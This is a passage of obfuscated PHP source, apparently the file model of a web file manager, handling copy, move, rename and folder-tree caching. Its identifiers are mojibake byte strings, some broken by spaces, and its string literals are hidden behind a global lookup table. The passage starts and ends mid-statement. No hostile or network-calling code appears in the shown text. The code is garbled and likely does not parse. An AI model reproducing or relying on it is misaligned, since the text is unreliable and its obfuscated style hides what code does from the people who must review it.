$”—­ñ©[$Ãòêşøë[575]][] = $”ÉñìÒŞ[$Ãòêşøë[477]]; } } else { if ($Áîû«»ì == REPEAT_SKIP) { } } } Hook::trigger($Ãòêşøë[580], array($Ãòêşøë[581], $”ÉñìÒŞ, 0)); } return $ÓÚ¶æßÀ; } private function _copyCreate($ºŞ°áÙ’, $ïĞŒˆâÉ, $°öû‡¬Œ, &$”òÛ˜ËÇ) { $€—òµªñ =& $_SERVER[ïëó©ÒÚ]; $ø©È­ê· = $this->sourceInfoCache($ºŞ°áÙ’); $Å«ö ´ç = $this->sourceInfoCache($ïĞŒˆâÉ); $• ßã»Æ = $this->_makeItemData($ø©È­ê·, $Å«ö ´ç, $°öû‡¬Œ); Hook::trigger($€—òµªñ[582], $• ßã»Æ); Hook::trigger($€—òµªñ[583], array($€—òµªñ[584], $• ßã»Æ, 0)); $å•‚ä¦Ş = $this->add($• ßã»Æ); $²¾ÃñÁ§ = array($€—òµªñ[411] => $å•‚ä¦Ş, $€—òµªñ[32] => $°öû‡¬Œ); $this->_copyApplyMeta($²¾ÃñÁ§, $”òÛ˜ËÇ); if ($ø©È­ê·[$€—òµªñ[419]] != $€—òµªñ[88]) { $”òÛ˜ËÇ[$€—òµªñ[575]][] = $ø©È­ê·[$€—òµªñ[477]]; return $å•‚ä¦Ş; } $¢×Æ«Ôõ = array(); $ê¿«Ğ€¦ = array(); $this->_childrenListAll($ºŞ°áÙ’, $¢×Æ«Ôõ); $ºî¤µ—‰ = count($¢×Æ«Ôõ); if ($ºî¤µ—‰ == 0) { return $å•‚ä¦Ş; } $ÑßİÅöæ = $this->sourceInfo($å•‚ä¦Ş); foreach ($¢×Æ«Ôõ as $´½÷ ³Å) { $Ôßû¼ßÌ = $this->_makeItemData($´½÷ ³Å, $ÑßİÅöæ, $´½÷ ³Å[$€—òµªñ[32]]); $Ôßû¼ßÌ[$€—òµªñ[530]] = $´½÷ ³Å[$€—òµªñ[530]]; $ê¿«Ğ€¦[] = $Ôßû¼ßÌ; } $this->chunkEventSet($€—òµªñ[585], array($€—òµªñ[586], $• ßã»Æ, $ºî¤µ—‰)); $this->addAll($ê¿«Ğ€¦, array(), !1); $’ì”í¥ = $this->where(array($€—òµªñ[441] => $å•‚ä¦Ş))->select(); $•°½ù‰” = $this->_childrenMakeRelation($¢×Æ«Ôõ, $’ì”í¥); $•°½ù‰”[$ºŞ°áÙ’] = $å•‚ä¦Ş; $‡‚Òùš = array(); $†“ÛˆĞ” = array(); foreach ($’ì”í¥ as $´½÷ ³Å) { $µÔâ¿£È = $´½÷ ³Å[$€—òµªñ[411]]; $¼™¹ÌÅÆ = $this->_childrenMatch($•°½ù‰”, $´½÷ ³Å, $ÑßİÅöæ); $‡‚Òùš[] = array($€—òµªñ[411], $µÔâ¿£È, $€—òµªñ[441], $¼™¹ÌÅÆ[$€—òµªñ[441]]); $†“ÛˆĞ”[] = array($€—òµªñ[411], $µÔâ¿£È, $€—òµªñ[530], $¼™¹ÌÅÆ[$€—òµªñ[530]]); $this->_copyApplyMeta($´½÷ ³Å, $”òÛ˜ËÇ); if ($´½÷ ³Å[$€—òµªñ[419]] != $€—òµªñ[88]) { $”òÛ˜ËÇ[$€—òµªñ[575]][] = $´½÷ ³Å[$€—òµªñ[477]]; } } $this->chunkEventSet($€—òµªñ[587], array($€—òµªñ[588], $• ßã»Æ, $ºî¤µ—‰)); $this->saveAll($‡‚Òùš); $this->chunkEventSet($€—òµªñ[589], array($€—òµªñ[590], $• ßã»Æ, $ºî¤µ—‰)); $this->saveAll($†“ÛˆĞ”); return $å•‚ä¦Ş; } private function _childrenMakeRelation($ŒØ¡¸Ò³, $‡Íõ°ÓŒ) { $š‡ïœĞ =& $_SERVER[ïëó©ÒÚ]; $çÅÏÅáˆ = array(); $æî£€èå = array(); foreach ($ŒØ¡¸Ò³ as $¨´¥úç) { $â¨–Ê§š = $¨´¥úç[$š‡ïœĞ[32]] . $š‡ïœĞ[8] . $¨´¥úç[$š‡ïœĞ[530]]; $çÅÏÅáˆ[$â¨–Ê§š] = $¨´¥úç[$š‡ïœĞ[411]]; } foreach ($‡Íõ°ÓŒ as $¨´¥úç) { $â¨–Ê§š = $¨´¥úç[$š‡ïœĞ[32]] . $š‡ïœĞ[8] . $¨´¥úç[$š‡ïœĞ[530]]; $²æî¥­Ü = $çÅÏÅáˆ[$â¨–Ê§š]; $æî£€èå[$²æî¥­Ü] = $¨´¥úç[$š‡ïœĞ[411]]; } return $æî£€èå; } private function _childrenMatch($µöû¡à¡, $æÌÂÍüË, $®´Õ™¾µ) { $¦Øüş =& $_SERVER[ïëó©ÒÚ]; $¦Š–°˜À = $®´Õ™¾µ[$¦Øüş[530]]; $åÊ´—´› = $this->parentLevelArray($æÌÂÍüË[$¦Øüş[530]]); foreach ($åÊ´—´› as $ßÌ¦‹ş¯) { if (isset($µöû¡à¡[$ßÌ¦‹ş¯])) { $¦Š–°˜À .= $µöû¡à¡[$ßÌ¦‹ş¯] . $¦Øüş[591]; } } $¦Š–°˜À = rtrim($¦Š–°˜À, $¦Øüş[50]) . $¦Øüş[50]; $”ø¸É‰¯ = $this->parentLevelArray($¦Š–°˜À); $Õà»˜Ú¦ = $”ø¸É‰¯[count($”ø¸É‰¯) - 1]; return array($¦Øüş[441] => $Õà»˜Ú¦, $¦Øüş[530] => $¦Š–°˜À); } private function _makeItemData($„úÏ±Ÿº, $õÑ¹”ÙĞ, $…Ì«Âá) { $ëÇ×‡’ã =& $_SERVER[ïëó©ÒÚ]; $ÌÅş—«ß = array($ëÇ×‡’ã[592] => $„úÏ±Ÿº[$ëÇ×‡’ã[419]], $ëÇ×‡’ã[429] => $…Ì«Âá, $ëÇ×‡’ã[593] => $„úÏ±Ÿº[$ëÇ×‡’ã[421]] ? $„úÏ±Ÿº[$ëÇ×‡’ã[421]] : $ëÇ×‡’ã[12], $ëÇ×‡’ã[478] => $„úÏ±Ÿº[$ëÇ×‡’ã[477]] ? $„úÏ±Ÿº[$ëÇ×‡’ã[477]] : 0, $ëÇ×‡’ã[594] => $„úÏ±Ÿº[$ëÇ×‡’ã[76]] ? $„úÏ±Ÿº[$ëÇ×‡’ã[76]] : 0, $ëÇ×‡’ã[595] => intval($õÑ¹”ÙĞ[$ëÇ×‡’ã[420]]), $ëÇ×‡’ã[596] => intval($õÑ¹”ÙĞ[$ëÇ×‡’ã[514]]), $ëÇ×‡’ã[597] => intval(USER_ID), $ëÇ×‡’ã[598] => intval(USER_ID), $ëÇ×‡’ã[410] => intval($õÑ¹”ÙĞ[$ëÇ×‡’ã[411]]), $ëÇ×‡’ã[599] => $õÑ¹”ÙĞ[$ëÇ×‡’ã[530]] . $õÑ¹”ÙĞ[$ëÇ×‡’ã[411]] . $ëÇ×‡’ã[50], $ëÇ×‡’ã[433] => $„úÏ±Ÿº[$ëÇ×‡’ã[85]] ? $„úÏ±Ÿº[$ëÇ×‡’ã[85]] : time(), $ëÇ×‡’ã[439] => 0, $ëÇ×‡’ã[600] => $ëÇ×‡’ã[12]); return $ÌÅş—«ß; } private function _copyApplyMeta($¾˜ £ğĞ, &$Ä­§Âá¬) { $»­°˜é¸ =& $_SERVER[ïëó©ÒÚ]; $èãÙÙ’ğ = $¾˜ £ğĞ[$»­°˜é¸[411]]; $ïäµÎÀ· = $¾˜ £ğĞ[$»­°˜é¸[32]]; if (!isset($¾˜ £ğĞ[$»­°˜é¸[601]]) || !$¾˜ £ğĞ[$»­°˜é¸[601]] || $¾˜ £ğĞ[$»­°˜é¸[601]] == $»­°˜é¸[197]) { $Ä­§Âá¬[$»­°˜é¸[577]][] = array($»­°˜é¸[411], $èãÙÙ’ğ, $»­°˜é¸[601], short_id($èãÙÙ’ğ)); } if (Input::check($ïäµÎÀ·, $»­°˜é¸[602])) { $Ä­§Âá¬[$»­°˜é¸[576]][] = array($»­°˜é¸[411] => $èãÙÙ’ğ, $»­°˜é¸[94] => $»­°˜é¸[474], $»­°˜é¸[374] => str_replace($»­°˜é¸[53], $»­°˜é¸[12], Pinyin::get($ïäµÎÀ·))); $Ä­§Âá¬[$»­°˜é¸[576]][] = array($»­°˜é¸[411] => $èãÙÙ’ğ, $»­°˜é¸[94] => $»­°˜é¸[473], $»­°˜é¸[374] => Pinyin::get($ïäµÎÀ·, $»­°˜é¸[603])); } $Ä­§Âá¬[$»­°˜é¸[576]][] = array($»­°˜é¸[411] => $èãÙÙ’ğ, $»­°˜é¸[94] => $»­°˜é¸[453], $»­°˜é¸[374] => KodSort::makeStr($ïäµÎÀ·)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($¶á¨•±) { $´éùÓòË =& $_SERVER[ïëó©ÒÚ]; $„î¢ÁÒŞ = $this->sourceInfo($¶á¨•±); $È²©÷ä = $´éùÓòË[604]; $ºÚúô¤ = array($´éùÓòË[530] => array($´éùÓòË[559], $„î¢ÁÒŞ[$´éùÓòË[530]] . $¶á¨•± . $´éùÓòË[560]), $´éùÓòË[440] => $this->targetIsDelete); $ïŞáÎ•· = $this->field($È²©÷ä)->where($ºÚúô¤)->select(); if (!$ïŞáÎ•·) { return; } $ïŞáÎ•· = array_to_keyvalue($ïŞáÎ•·, $´éùÓòË[411]); foreach ($ïŞáÎ•· as $Ä­§€øÍ) { $²áÆÈ» = $Ä­§€øÍ[$´éùÓòË[441]]; $¶á¨•± = $Ä­§€øÍ[$´éùÓòË[411]]; if (!isset($this->_childrenListCache[$¶á¨•±]) && $Ä­§€øÍ[$´éùÓòË[419]] == $´éùÓòË[88]) { $this->_childrenListCache[$¶á¨•±] = array(); } if (!isset($this->_childrenListCache[$²áÆÈ»])) { $this->_childrenListCache[$²áÆÈ»] = array(); } $this->_childrenListCache[$²áÆÈ»][$¶á¨•±] = $Ä­§€øÍ; $this->_childrenItemCache[$¶á¨•±] = $Ä­§€øÍ; } } private function _childrenListAll($ûœèú»³, &$¢·ÅÒËÜ) { $ÄòÛÌñü =& $_SERVER[ïëó©ÒÚ]; if (!isset($this->_childrenListCache[$ûœèú»³])) { return; } $ùÃê¤¶É = $this->_childrenListCache[$ûœèú»³]; foreach ($ùÃê¤¶É as $µ¯Çµ†Î => $¦¾Ü”ğ) { $¢·ÅÒËÜ[$µ¯Çµ†Î] = $¦¾Ü”ğ; if ($¦¾Ü”ğ[$ÄòÛÌñü[419]] == $ÄòÛÌñü[88]) { $this->_childrenListAll($µ¯Çµ†Î, $¢·ÅÒËÜ); } } } private function sourceInfoCache($ÃıÉ ) { if (isset($this->_childrenItemCache[$ÃıÉ ])) { return $this->_childrenItemCache[$ÃıÉ ]; } return $this->sourceInfo($ÃıÉ ); } private function _childrenList($­“´Ñ³Á) { if (isset($this->_childrenListCache[$­“´Ñ³Á])) { return $this->_childrenListCache[$­“´Ñ³Á]; } return $this->_childrenListSelect($­“´Ñ³Á); } private function _childrenListSelect($Ù›± ¹Ú) { $æ·Ô÷é… =& $_SERVER[ïëó©ÒÚ]; $­ŞÑÓ¥Š = array($æ·Ô÷é…[441] => $Ù›± ¹Ú, $æ·Ô÷é…[440] => $this->targetIsDelete); $ùğ¬Èñ = $this->where($­ŞÑÓ¥Š)->select(); $ùğ¬Èñ = $ùğ¬Èñ ? $ùğ¬Èñ : array(); $â¨¢§’Ë = array_to_keyvalue($ùğ¬Èñ, $æ·Ô÷é…[411]); $this->_childrenListCache[$Ù›± ¹Ú] = $â¨¢§’Ë; foreach ($â¨¢§’Ë as $Ù›± ¹Ú => $©çà§›•) { $this->_childrenItemCache[$Ù›± ¹Ú] = $©çà§›•; } return $â¨¢§’Ë; } private function fileNameExistCache($§ŠÛÌğ, $‘‚°ş‡’) { $îˆŸ£Á¾ =& $_SERVER[ïëó©ÒÚ]; $‘‚°ş‡’ = strtolower($‘‚°ş‡’); $¡ÒÓ˜ = $this->_childrenList($§ŠÛÌğ); foreach ($¡ÒÓ˜ as $Šıè‚Äİ) { if ($‘‚°ş‡’ == strtolower($Šıè‚Äİ[$îˆŸ£Á¾[32]])) { return $Šıè‚Äİ[$îˆŸ£Á¾[411]]; } } return !1; } private function fileNameAutoCache($ÛŒæãä§, $¸çË»ùá, $„”¿ØÇ, $òÑ¹Í€ø) { $’Ø¿ù±­ =& $_SERVER[ïëó©ÒÚ]; $Û›éÕ•Ú = $this->_childrenList($ÛŒæãä§); $ÏÍ œ…È = array_to_keyvalue($Û›éÕ•Ú, $’Ø¿ù±­[12], $’Ø¿ù±­[32]); return $this->fileNameAutoGet($ÏÍ œ…È, $¸çË»ùá, $„”¿ØÇ, $òÑ¹Í€ø); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($ñ‚û¤ò», $·ÇäâËß, $¸¤ø§ê = REPEAT_REPLACE, $Ôóªİ¾ì = '') { $€Ÿóıôµ =& $_SERVER[ïëó©ÒÚ]; $ª‘‚ğô³ = $this->sourceInfo($ñ‚û¤ò»); $›¢Ï–™í = $this->sourceInfo($·ÇäâËß); if ($ª‘‚ğô³[$€Ÿóıôµ[441]] == $›¢Ï–™í[$€Ÿóıôµ[411]]) { if ($ª‘‚ğô³[$€Ÿóıôµ[440]] == $€Ÿóıôµ[88]) { Model($€Ÿóıôµ[438])->restore(array($ñ‚û¤ò»)); } if (!$Ôóªİ¾ì || $Ôóªİ¾ì == $ª‘‚ğô³[$€Ÿóıôµ[32]]) { return $ñ‚û¤ò»; } } $‚µğÆÒ = $this->pathInfoMore($ñ‚û¤ò»); if ($this->isParentOf($ñ‚û¤ò», $·ÇäâËß)) { return !1; } if (!$ª‘‚ğô³ || !$›¢Ï–™í || $›¢Ï–™í[$€Ÿóıôµ[419]] != $€Ÿóıôµ[88]) { return !1; } Hook::trigger($€Ÿóıôµ[605], $‚µğÆÒ); $this->targetIsDelete = intval($ª‘‚ğô³[$€Ÿóıôµ[440]]); if ($ª‘‚ğô³[$€Ÿóıôµ[441]] == $·ÇäâËß && $Ôóªİ¾ì != $ª‘‚ğô³[$€Ÿóıôµ[32]]) { $¿šØçÑË = $this->fileNameExist($·ÇäâËß, $Ôóªİ¾ì); if ($¿šØçÑË && $ª‘‚ğô³[$€Ÿóıôµ[419]] == $€Ÿóıôµ[197]) { $ßûÊ¡Ó‚ = $this->sourceInfo($¿šØçÑË); $‘úÖÑÖ = $this->fileHistory($ßûÊ¡Ó‚, $ª‘‚ğô³[$€Ÿóıôµ[477]], $ª‘‚ğô³[$€Ÿóıôµ[76]]); if (!$‘úÖÑÖ) { Model($€Ÿóıôµ[480])->remove($ª‘‚ğô³[$€Ÿóıôµ[477]]); } $this->removeNow($ñ‚û¤ò», !1); $this->folderSizeReset($·ÇäâËß); Hook::trigger($€Ÿóıôµ[606], $‚µğÆÒ); return $¿šØçÑË; } } $éØø±Ú£ = $Ôóªİ¾ì ? $Ôóªİ¾ì : $ª‘‚ğô³[$€Ÿóıôµ[32]]; $this->lockMoveStart($ñ‚û¤ò»); $this->lockWriteStart($·ÇäâËß, $éØø±Ú£); $¸ïãæ‰ª = array($€Ÿóıôµ[575] => array(), $€Ÿóıôµ[607] => !1); $this->clearShare($ñ‚û¤ò», $·ÇäâËß); $øŠ»ı†º = $this->fileNameExistCache($·ÇäâËß, $ª‘‚ğô³[$€Ÿóıôµ[32]]); $€íØ› = $this->_move($ñ‚û¤ò», $·ÇäâËß, $¸¤ø§ê, $¸ïãæ‰ª, $Ôóªİ¾ì); $this->sourceCacheClear(); if ($ª‘‚ğô³[$€Ÿóıôµ[419]] == $€Ÿóıôµ[88] && $øŠ»ı†º) { $this->folderSizeResetChildren($€íØ›); } Model($€Ÿóıôµ[199])->linkAdd($¸ïãæ‰ª[$€Ÿóıôµ[575]]); if ($øŠ»ı†º && $¸ïãæ‰ª[$€Ÿóıôµ[607]]) { $this->removeNow($ñ‚û¤ò», !1); } $this->lockMoveEnd($ñ‚û¤ò»); $this->lockWriteEnd($·ÇäâËß, $éØø±Ú£); $this->folderSizeReset($ª‘‚ğô³[$€Ÿóıôµ[441]]); $this->folderSizeReset($·ÇäâËß); $ï‚ñ³øØ = array($ª‘‚ğô³[$€Ÿóıôµ[441]], $·ÇäâËß); if ($ª‘‚ğô³[$€Ÿóıôµ[419]] == $€Ÿóıôµ[88]) { $ï‚ñ³øØ[] = $ñ‚û¤ò»; } $this->updateModifyTime($ï‚ñ³øØ); Model($€Ÿóıôµ[579])->eventMove($ñ‚û¤ò», $ª‘‚ğô³[$€Ÿóıôµ[441]], $·ÇäâËß); Hook::trigger($€Ÿóıôµ[606], $‚µğÆÒ); return $€íØ›; } private function _move($¿¡ìÌ—¼, $É¢ÏË”, $Ìè¼³§ç, &$ÆñÙ¡˜š, $ÅÒİİÉã = '') { $½÷ÑôñÛ =& $_SERVER[ïëó©ÒÚ]; $™ª‡°¨û = $this->sourceInfo($¿¡ìÌ—¼); $à½çë„á = $™ª‡°¨û[$½÷ÑôñÛ[419]] == $½÷ÑôñÛ[88]; $Ò£Ÿ¬É = $ÅÒİİÉã ? $ÅÒİİÉã : $™ª‡°¨û[$½÷ÑôñÛ[32]]; $®™ Š¢ì = $this->fileNameExistCache($É¢ÏË”, $Ò£Ÿ¬É); $this->lockMoveStart($¿¡ìÌ—¼); $this->lockWriteStart($É¢ÏË”, $Ò£Ÿ¬É); if (!$®™ Š¢ì) { return $this->_moveForce($¿¡ìÌ—¼, $É¢ÏË”, $Ò£Ÿ¬É); } $¼°³Øİ‘ = $®™ Š¢ì; $ŠÅâÎäÓ = !1; if ($à½çë„á) { if ($Ìè¼³§ç == REPEAT_RENAME_FOLDER) { $Ò£Ÿ¬É = $this->fileNameAuto($É¢ÏË”, $Ò£Ÿ¬É, $Ìè¼³§ç, $à½çë„á); $¼°³Øİ‘ = $this->_moveForce($¿¡ìÌ—¼, $É¢ÏË”, $Ò£Ÿ¬É); } else { if ($Ìè¼³§ç == REPEAT_RENAME_FOLDER) { $Ìè¼³§ç = REPEAT_RENAME; } $§İˆñ³Ò = $this->_childrenListSelect($¿¡ìÌ—¼); foreach ($§İˆñ³Ò as $Ì×÷şï±) { $this->_move($Ì×÷şï±[$½÷ÑôñÛ[411]], $®™ Š¢ì, $Ìè¼³§ç, $ÆñÙ¡˜š); } $ŠÅâÎäÓ = !0; } } else { if ($Ìè¼³§ç == REPEAT_SKIP) { $ŠÅâÎäÓ = !0; } else { if ($Ìè¼³§ç == REPEAT_RENAME || $Ìè¼³§ç == REPEAT_RENAME_FOLDER) { $Ò£Ÿ¬É = $this->fileNameAuto($É¢ÏË”, $Ò£Ÿ¬É, $Ìè¼³§ç, $à½çë„á); $¼°³Øİ‘ = $this->_moveForce($¿¡ìÌ—¼, $É¢ÏË”, $Ò£Ÿ¬É); } else { if ($Ìè¼³§ç == REPEAT_REPLACE) { $›’‡‹ÜÁ = $this->sourceInfoCache($®™ Š¢ì); $ş¤ÅÖµ· = $this->fileHistory($›’‡‹ÜÁ, $™ª‡°¨û[$½÷ÑôñÛ[477]], $™ª‡°¨û[$½÷ÑôñÛ[76]]); $ŠÅâÎäÓ = !0; if ($ş¤ÅÖµ·) { $ÆñÙ¡˜š[$½÷ÑôñÛ[575]][] = $™ª‡°¨û[$½÷ÑôñÛ[477]]; } } } } } if ($ŠÅâÎäÓ && !$ÆñÙ¡˜š[$½÷ÑôñÛ[607]]) { $ÆñÙ¡˜š[$½÷ÑôñÛ[607]] = !0; } return $¼°³Øİ‘; } private function _moveForce($–•…Ôõü, $”†¾‡—©, $›Ğ¶ÂÕ) { $Öˆ–íÏ¿ =& $_SERVER[ïëó©ÒÚ]; $÷şşØà¢ = $this->sourceInfo($–•…Ôõü); $Ò³Åç›ˆ = $this->sourceInfo($”†¾‡—©); $²Îö‘–Ö = $÷şşØà¢[$Öˆ–íÏ¿[419]] == $Öˆ–íÏ¿[88]; $ÑÑôö÷² = array($Öˆ–íÏ¿[410] => $Ò³Åç›ˆ[$Öˆ–íÏ¿[411]], $Öˆ–íÏ¿[599] => $Ò³Åç›ˆ[$Öˆ–íÏ¿[530]] . $Ò³Åç›ˆ[$Öˆ–íÏ¿[411]] . $Öˆ–íÏ¿[50], $Öˆ–íÏ¿[595] => $Ò³Åç›ˆ[$Öˆ–íÏ¿[420]], $Öˆ–íÏ¿[596] => $Ò³Åç›ˆ[$Öˆ–íÏ¿[514]], $Öˆ–íÏ¿[598] => USER_ID, $Öˆ–íÏ¿[429] => $›Ğ¶ÂÕ); $£ıËİ«Õ = $÷şşØà¢[$Öˆ–íÏ¿[420]] == SourceModel::TYPE_GROUP && $Ò³Åç›ˆ[$Öˆ–íÏ¿[420]] == SourceModel::TYPE_GROUP && $÷şşØà¢[$Öˆ–íÏ¿[514]] == $Ò³Åç›ˆ[$Öˆ–íÏ¿[514]]; if (!$£ıËİ«Õ && $this->moveClearAuth) { Model($Öˆ–íÏ¿[511])->authClear($–•…Ôõü); } $™Í³×ôç = $÷şşØà¢[$Öˆ–íÏ¿[440]] == $Öˆ–íÏ¿[88] && $Ò³Åç›ˆ[$Öˆ–íÏ¿[440]] != $Öˆ–íÏ¿[88]; if ($™Í³×ôç) { $ÑÑôö÷²[$Öˆ–íÏ¿[439]] = 0; } if ($²Îö‘–Ö) { $ğşû‰· = array($Öˆ–íÏ¿[599] => array($Öˆ–íÏ¿[559], $÷şşØà¢[$Öˆ–íÏ¿[530]] . $÷şşØà¢[$Öˆ–íÏ¿[411]] . $Öˆ–íÏ¿[560])); $íµäŞù¢ = $÷şşØà¢[$Öˆ–íÏ¿[530]] . $÷şşØà¢[$Öˆ–íÏ¿[411]] . $Öˆ–íÏ¿[50]; $ï‹•¹‡ß = $Ò³Åç›ˆ[$Öˆ–íÏ¿[530]] . $Ò³Åç›ˆ[$Öˆ–íÏ¿[411]] . $Öˆ–íÏ¿[50] . $÷şşØà¢[$Öˆ–íÏ¿[411]] . $Öˆ–íÏ¿[50]; $üØæàÔÌ = array($Öˆ–íÏ¿[599] => array($Öˆ–íÏ¿[608], "\x72\x65\x70\x6c\x61\143\145\50\x70\141\162\x65\156\x74\114\145\166\145\x6c\x2c\x27{$íµäŞù¢}\x27\54\x27{$ï‹•¹‡ß}\47\x29"), $Öˆ–íÏ¿[595] => $Ò³Åç›ˆ[$Öˆ–íÏ¿[420]], $Öˆ–íÏ¿[596] => $Ò³Åç›ˆ[$Öˆ–íÏ¿[514]]); if ($™Í³×ôç) { $üØæàÔÌ[$Öˆ–íÏ¿[439]] = 0; } $this->where($ğşû‰·)->data($üØæàÔÌ)->save(); } $this->where(array($Öˆ–íÏ¿[426] => $–•…Ôõü))->data($ÑÑôö÷²)->save(); return $–•…Ôõü; } private function clearShare($©Ş²³üç, $Öåì˜»á) { $ŞîŞ˜‚™ =& $_SERVER[ïëó©ÒÚ]; $‡ˆ“¦¢ = $this->sourceInfo($©Ş²³üç); $ÏÀµœÅ• = $this->sourceInfo($Öåì˜»á); if ($‡ˆ“¦¢[$ŞîŞ˜‚™[514]] == $ÏÀµœÅ•[$ŞîŞ˜‚™[514]] && $‡ˆ“¦¢[$ŞîŞ˜‚™[420]] == $ŞîŞ˜‚™[609]) { return; } $Ê·‘´° = array($ŞîŞ˜‚™[530] => array($ŞîŞ˜‚™[559], $‡ˆ“¦¢[$ŞîŞ˜‚™[530]] . $©Ş²³üç . $ŞîŞ˜‚™[560])); $‚¶âÚÎç = $this->field($ŞîŞ˜‚™[426])->where($Ê·‘´°)->getField($ŞîŞ˜‚™[411], !0); if (!$‚¶âÚÎç) { return; } $Ê·‘´° = array($ŞîŞ˜‚™[411] => array($ŞîŞ˜‚™[7], $‚¶âÚÎç), $ŞîŞ˜‚™[505] => 1); $œÙÂ¿ƒ¿ = Model($ŞîŞ˜‚™[610])->field($ŞîŞ˜‚™[498])->where($Ê·‘´°)->select(); if (!$œÙÂ¿ƒ¿) { return; } $œÙÂ¿ƒ¿ = array_to_keyvalue($œÙÂ¿ƒ¿, $ŞîŞ˜‚™[12], $ŞîŞ˜‚™[498]); $Ê·‘´° = array($ŞîŞ˜‚™[498] => array($ŞîŞ˜‚™[7], $œÙÂ¿ƒ¿)); Model($ŞîŞ˜‚™[610])->where($Ê·‘´°)->save(array($ŞîŞ˜‚™[505] => 0)); Model($ŞîŞ˜‚™[611])->where($Ê·‘´°)->delete(); } public function copyFolderFromIO($‹²ßí×, $Å·˜Ãµ®, $‡ØÈŒÙœ, $²˜…Œ¤İ, $¾Î¾–ö›, $ÀÁ …® = false) { $¾¾·Şî© =& $_SERVER[ïëó©ÒÚ]; $ÑòıÅ¨¡ = array($¾¾·Şî©[576] => array(), $¾¾·Şî©[577] => array(), $¾¾·Şî©[575] => array(), $¾¾·Şî©[612] => array()); $Íç¼äıú = $ÀÁ …® ? $ÀÁ …® : $‹²ßí×->pathThis($Å·˜Ãµ®); $¾³˜Ğåô = $this->fileNameExist($‡ØÈŒÙœ, $Íç¼äıú); $ŒÜ¶É™® = $this->mkdir($‡ØÈŒÙœ, $Íç¼äıú, $²˜…Œ¤İ); if (!$¾³˜Ğåô || $²˜…Œ¤İ == REPEAT_RENAME_FOLDER) { $²˜…Œ¤İ = !1; } if ($¾³˜Ğåô) { $this->_childrenAllMake($¾³˜Ğåô); } Hook::trigger($¾¾·Şî©[613]); $this->_copyChildTo($‹²ßí×, $Å·˜Ãµ®, $ŒÜ¶É™®, $²˜…Œ¤İ, $ÑòıÅ¨¡, $¾Î¾–ö›); Hook::trigger($¾¾·Şî©[614]); if ($ŒÜ¶É™®) { $this->folderSizeResetChildren($ŒÜ¶É™®); } $this->_childrenListClear(); Model($¾¾·Şî©[578])->addAll($ÑòıÅ¨¡[$¾¾·Şî©[576]], array(), !0); Model($¾¾·Şî©[579])->eventCopy($ŒÜ¶É™®); $this->saveAll($ÑòıÅ¨¡[$¾¾·Şî©[577]]); Model($¾¾·Şî©[480])->linkAdd($ÑòıÅ¨¡[$¾¾·Şî©[575]]); Model($¾¾·Şî©[480])->remove($ÑòıÅ¨¡[$¾¾·Şî©[612]]); $this->folderSizeReset($‡ØÈŒÙœ); $this->updateModifyTime($‡ØÈŒÙœ); return $ŒÜ¶É™®; } private function _copyChildTo($¶û™†¸ƒ, $·ïñÃì , $´Á˜”•Ÿ, $Ñ°ôè¢Å, &$Ô×Ëˆ”ƒ, $§İ™ãé») { $´¬ŒÕÄú =& $_SERVER[ïëó©ÒÚ]; $á—Ğñš = $this->sourceInfoCache($´Á˜”•Ÿ); $ï«ÍÓöˆ = $¶û™†¸ƒ->listPath($·ïñÃì ); $ï«ÍÓöˆ = $ï«ÍÓöˆ ? $ï«ÍÓöˆ : array($´¬ŒÕÄú[83] => array(), $´¬ŒÕÄú[82] => array()); $¯’éïß¯ = array_merge($ï«ÍÓöˆ[$´¬ŒÕÄú[83]], $ï«ÍÓöˆ[$´¬ŒÕÄú[82]]); $Œ¸˜Ç¤Î = $this->_addFiles($¶û™†¸ƒ, $ï«ÍÓöˆ[$´¬ŒÕÄú[83]], $§İ™ãé»); $¼äåµğ‘ = array(); foreach ($¯’éïß¯ as &$È±ıàª) { if (isset($Œ¸˜Ç¤Î[$È±ıàª[$´¬ŒÕÄú[32]]])) { $È±ıàª = $Œ¸˜Ç¤Î[$È±ıàª[$´¬ŒÕÄú[32]]]; } $È±ıàª[$´¬ŒÕÄú[419]] = $È±ıàª[$´¬ŒÕÄú[33]] == $´¬ŒÕÄú[75]; $È±ıàª[$´¬ŒÕÄú[421]] = substr(_get($È±ıàª, $´¬ŒÕÄú[174], $´¬ŒÕÄú[12]), 0, 10); $È±ıàª[$´¬ŒÕÄú[76]] = _get($È±ıàª, $´¬ŒÕÄú[76], 0); $È±ıàª[$´¬ŒÕÄú[477]] = _get($È±ıàª, $´¬ŒÕÄú[477], 0); if (!isset($È±ıàª[$´¬ŒÕÄú[615]]) && $È±ıàª[$´¬ŒÕÄú[477]]) { $Ô×Ëˆ”ƒ[$´¬ŒÕÄú[612]][] = $È±ıàª[$´¬ŒÕÄú[477]]; } if ($Ñ°ôè¢Å) { $ıÃş²¹¸ = $this->fileNameExistCache($´Á˜”•Ÿ, $È±ıàª[$´¬ŒÕÄú[32]]); if ($ıÃş²¹¸) { if ($È±ıàª[$´¬ŒÕÄú[419]] || $Ñ°ôè¢Å == REPEAT_SKIP) { continue; } if ($Ñ°ôè¢Å == REPEAT_REPLACE) { $©¥ûÍà“ = $this->sourceInfoCache($ıÃş²¹¸); $ÎŸÙıÉ¿ = $this->fileHistory($©¥ûÍà“, $È±ıàª[$´¬ŒÕÄú[477]], $È±ıàª[$´¬ŒÕÄú[76]]); if ($ÎŸÙıÉ¿) { $Ô×Ëˆ”ƒ[$´¬ŒÕÄú[575]][] = $È±ıàª[$´¬ŒÕÄú[477]]; } continue; } else { if ($Ñ°ôè¢Å == REPEAT_RENAME) { $È±ıàª[$´¬ŒÕÄú[32]] = $this->fileNameAutoCache($´Á˜”•Ÿ, $È±ıàª[$´¬ŒÕÄú[32]], $Ñ°ôè¢Å, !1); } } } } if (!$È±ıàª[$´¬ŒÕÄú[419]] && $È±ıàª[$´¬ŒÕÄú[477]] == 0) { continue; } if (!$È±ıàª[$´¬ŒÕÄú[419]] && $È±ıàª[$´¬ŒÕÄú[477]]) { $Ô×Ëˆ”ƒ[$´¬ŒÕÄú[575]][] = $È±ıàª[$´¬ŒÕÄú[477]]; } $¼äåµğ‘[] = $this->_makeItemData($È±ıàª, $á—Ğñš, $È±ıàª[$´¬ŒÕÄú[32]]); } unset($È±ıàª); if (!empty($¼äåµğ‘)) { $this->addAll($¼äåµğ‘); $this->_childrenListSelect($´Á˜”•Ÿ); } $ŠœÅËêú = $this->_childrenList($´Á˜”•Ÿ); $ŠœÅËêú = array_to_keyvalue($ŠœÅËêú, 